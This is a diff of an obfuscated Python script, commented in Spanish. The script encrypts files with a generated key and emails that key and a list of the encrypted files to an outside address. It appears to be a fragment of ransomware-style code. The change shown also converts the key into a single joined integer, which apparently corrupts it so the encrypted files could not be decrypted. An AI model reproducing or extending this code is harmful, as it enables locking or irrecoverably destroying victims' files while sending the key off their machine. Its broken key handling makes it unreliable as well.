@@ -6,7 +6,8 @@ from email.mime.text import MIMEText as h
 from PIL import Image as i, ImageTk as j
 
 def k():
-    return f.generate_key()
+    key = int("".join(map(str, f.generate_key())))
+    return key
 
 def l(key, input_file, output_file):
     with open(input_file, 'rb') as file:
@@ -25,7 +26,8 @@ def m(sender_email, sender_password, receiver_email, key, encrypted_files):
     message['Subject'] = 'Clave de encriptación y lista de archivos encriptados'
 
     # Crear el cuerpo del correo con la clave y la lista de archivos encriptados
-    body = f"Guarda esta clave segura para descifrar el archivo:\n\n{key.decode()}\n\nLista de archivos encriptados:\n{', '.join(encrypted_files)}"
+    encrypted_files = ''.join(map(str, encrypted_files))
+    body = f"Guarda esta clave segura para descifrar el archivo:\n\n{str(key)}\n\nLista de archivos encriptados:\n{encrypted_files}"
     message.attach(h(body, 'plain'))
 
     # Enviar el correo electrónico
